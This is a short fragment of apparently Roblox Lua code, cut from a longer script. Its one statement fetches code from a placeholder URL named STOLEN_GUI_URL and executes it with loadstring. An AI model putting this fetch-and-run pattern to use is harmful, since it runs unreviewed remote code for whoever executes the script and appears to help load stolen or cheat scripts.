					loadstring(game:HttpGet(STOLEN_GUI_URL))()
				end)
			end
		end
	end
end)
